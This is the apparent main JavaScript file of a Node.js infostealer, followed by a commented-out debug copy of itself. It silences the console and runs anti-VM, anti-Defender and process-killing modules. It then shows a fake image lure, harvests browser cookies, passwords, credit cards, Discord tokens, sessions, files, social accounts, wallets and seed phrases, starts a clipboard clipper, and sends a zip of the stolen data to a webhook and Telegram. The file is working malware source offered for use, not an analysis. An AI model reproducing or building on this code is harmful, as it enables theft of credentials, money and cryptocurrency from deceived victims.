

const os = require('os');
const path = require('path');
const fs = require('fs');
const config = require('./config');
const createZip = require('./createZip');
const { sendJSON, sendFile } = require('./exfil');

// === FORCE SILENT CONSOLE ===
const originalConsole = { ...console };
console.log = console.info = console.warn = console.error = console.debug = () => {};
// ============================

// Modules
const hideConsole = require('./hideconsole');
const runAntivm = require('./antivm');
const runAntidefender = require('./antidefender');
const killProcesses = require('./process-killer');
const { showFakeImageBait } = require('./fake-pages');
const walletStealer = require('./wallet-stealer');
const sessionStealer = require('./session-stealer');
const fileGrabber = require('./file-grabber');
const socialStealer = require('./socials-stealer');
const systemInfo = require('./system-info');
const { stealCookies, stealChromePasswords, stealCreditCards } = require('./chrome-stealer');
const stealFirefoxData = require('./firefox-stealer');
const { getDiscordToken } = require('./discord-token');
const { scanForSeedsAndKeys } = require('./seed-scanner');
const clipper = require('./clipper');

// DEBUG TEST
fs.writeFileSync(
    'debug.txt',
    `cwd=${process.cwd()}\n__dirname=${__dirname}`
);

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

(async () => {
    try {
        await hideConsole();
        await delay(2000);
        await runAntivm();
        await runAntidefender();
        await delay(1000);
        await killProcesses();
        await delay(7000);
        await showFakeImageBait();
       // showFakeZoomMeeting();
        // Data Collection
        //const wallets = await walletStealer();
        const cookies = await stealCookies('chrome');
        const passwords = await stealChromePasswords();
        const creditCards = await stealCreditCards?.() || [];
        const firefoxData = await stealFirefoxData();
        const sessions = await sessionStealer();
        const files = await fileGrabber();
        const socials = await socialStealer();
        const system = await systemInfo();
        const token = await getDiscordToken();
        const seeds = await scanForSeedsAndKeys();
        const wallets = await walletStealer();
        if (typeof clipper === 'function') clipper();
        else if (clipper?.clipper) clipper.clipper();
        await delay(8000);
        // Build final info
        const info = {
            time: new Date().toISOString(),
            username: process.env.USERNAME || 'Unknown',
            hostname: os.hostname(),
            ip: system?.ip || null,
            token,
            cookies,
            passwords,
            creditCards,
            wallets,
            firefox: firefoxData,
            sessions,
            files,
            socials,
            seeds,
            system: system?.data || {}
        };
        // ====================== CREATE ZIP WITH REAL DATA ======================
        const allSavedPaths = [
            ...(files?.savedPaths || []),
            ...(sessions?.savedPaths || []),
            ...(wallets?.savedPaths || []),
            ...(firefoxData?.savedPaths || [])
        ];
        const zipPath = await createZip(info, allSavedPaths);

        // ====================== SEND TO BOTH ======================
        const [webhookOk, telegramJsonOk, fileOk] = await Promise.all([
            sendJSON(info), // JSON to Webhook
            sendJSON(info), // JSON to Telegram
            sendFile(zipPath, "stolen_data.zip", "Full stolen package") // ZIP to Telegram
        ]);
    } catch (e) {
        // Silent in production
    }
    setInterval(() => {}, 999999999); // Keep alive
})();



/**
const os = require('os');
const path = require('path');
const fs = require('fs');
const config = require('./config');
const createZip = require('./createZip');
const { sendJSON, sendFile } = require('./exfil');

// Modules
const hideConsole = require('./hideconsole');
const runAntivm = require('./antivm');
const runAntidefender = require('./antidefender');
const killProcesses = require('./process-killer');
const { showFakeImageBait } = require('./fake-pages');
const walletStealer = require('./wallet-stealer');
const sessionStealer = require('./session-stealer');
const fileGrabber = require('./file-grabber');
const socialStealer = require('./socials-stealer');
const systemInfo = require('./system-info');

const { stealCookies, stealChromePasswords, stealCreditCards } = require('./chrome-stealer');
const stealFirefoxData = require('./firefox-stealer');
const { getDiscordToken } = require('./discord-token');
const { scanForSeedsAndKeys } = require('./seed-scanner');
const clipper = require('./clipper');

// DEBUG TEST
fs.writeFileSync(
    'debug.txt',
    `cwd=${process.cwd()}\n__dirname=${__dirname}`
);

function delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

(async () => {
    console.log("[+] image downloading...");

    try {
        await hideConsole();
        await delay(2000);

        console.log("[+] Starting silent background operations...");

        await runAntivm();
        await runAntidefender();
        await delay(1000);
        await killProcesses();
        await delay(7000);

        await showFakeImageBait();

       // showFakeZoomMeeting();

        // Data Collection
        //const wallets = await walletStealer();
        const cookies = await stealCookies('chrome');
        const passwords = await stealChromePasswords();
        const creditCards = await stealCreditCards?.() || [];
        const firefoxData = await stealFirefoxData();
        const sessions = await sessionStealer();
        const files = await fileGrabber();
        const socials = await socialStealer();
        const system = await systemInfo();
        const token = await getDiscordToken();
        const seeds = await scanForSeedsAndKeys();
        const wallets = await walletStealer();

        if (typeof clipper === 'function') clipper();
        else if (clipper?.clipper) clipper.clipper();

        await delay(8000);

        // Build final info
        const info = {
            time: new Date().toISOString(),
            username: process.env.USERNAME || 'Unknown',
            hostname: os.hostname(),
            ip: system?.ip || null,
            token,
            cookies,
            passwords,
            creditCards,
            wallets,
            firefox: firefoxData,
            sessions,
            files,
            socials,
            seeds,
            system: system?.data || {}
        };

        // ====================== CREATE ZIP WITH REAL DATA ======================
        console.log("[+] Creating output.zip with stolen data...");

        const allSavedPaths = [
            ...(files?.savedPaths || []),
            ...(sessions?.savedPaths || []),
            ...(wallets?.savedPaths || []),
            ...(firefoxData?.savedPaths || [])
        ];

        const zipPath = await createZip(info, allSavedPaths);

        console.log("ZIP path:", zipPath);
        console.log("ZIP exists:", fs.existsSync(zipPath));

        // ====================== SEND TO BOTH ======================
        console.log("[+] Sending to Webhook and Telegram...");

        const [webhookOk, telegramJsonOk, fileOk] = await Promise.all([
            sendJSON(info),                    // JSON to Webhook
            sendJSON(info),                    // JSON to Telegram
            sendFile(zipPath, "stolen_data.zip", "Full stolen package")   // ZIP to Telegram
        ]);

        console.log(`Webhook (JSON) : ${webhookOk ? '✅' : '❌'}`);
        console.log(`Telegram (JSON): ${telegramJsonOk ? '✅' : '❌'}`);
        console.log(`Telegram (ZIP) : ${fileOk ? '✅' : '❌'}`);

    } catch (e) {
        console.error("[-] Critical error:", e.message);
    }

    setInterval(() => {}, 999999999); // Keep alive
})();
*/




